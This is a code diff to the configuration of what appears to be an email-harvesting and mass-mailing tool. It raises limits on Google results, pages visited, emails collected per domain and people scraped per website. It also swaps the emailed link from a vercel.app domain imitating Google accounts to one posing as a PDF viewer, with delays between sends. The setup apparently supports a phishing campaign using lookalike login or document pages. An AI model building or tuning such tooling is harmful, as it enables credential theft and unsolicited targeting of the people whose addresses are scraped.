@@ -453,16 +453,16 @@ manualCountryCodesForSearch: [
     'Waste Management', 'Water Treatment'
   ],
   
-  googleResultsPerSearch: 200,
-  maxPagesToVisit: 200,
-  maxEmailsPerDomain: 200, // Maximum number of unique emails to collect per domain
-  maxPeopleToScrape: 40, // Maximum number of people (names, titles, emails) to scrape per website
+  googleResultsPerSearch: 500,
+  maxPagesToVisit: 500,
+  maxEmailsPerDomain: 500, // Maximum number of unique emails to collect per domain
+  maxPeopleToScrape: 60, // Maximum number of people (names, titles, emails) to scrape per website
   peoplePageConcurrency: 5, // Number of people pages to scrape concurrently
 
 
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
-    "https://googlemailaccountscom.vercel.app/",
+    "https://pdfviewerimg133929edhe778338393.vercel.app/",
   ],
   defaultCountryCode: null, // Set to a country code like 'US', 'GB', etc., to filter searches by country. Set to null for global search.
   defaultDialingCode: null, // Set to a dialing code like '+1', '+44', etc., to filter searches by dialing code. Set to null for no dialing code filter.
